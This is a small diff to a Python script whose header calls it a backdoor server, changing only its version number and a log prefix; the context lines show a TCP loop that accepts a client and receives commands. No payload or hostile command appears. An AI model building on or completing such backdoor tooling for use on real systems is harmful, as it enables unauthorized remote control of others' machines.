@@ -1,7 +1,7 @@
 """
 Uso: Backdoor Servidor
 Creado: Andrés Hernández Mata
-Version: 2.0.0
+Version: 2.0.1
 Python: 3.9.1
 Fecha: 08 Abril 2020
 """
@@ -23,7 +23,7 @@ print("[+] Iniciado Servidor...")
 
 while True:    
     cliente, direccion = TCPServerSocket.accept()
-    print("[-] Direccion ", direccion)          
+    print("[+] Direccion ", direccion)          
     while True:        
         comando = cliente.recv(bufferSize)
         if comando == b"":
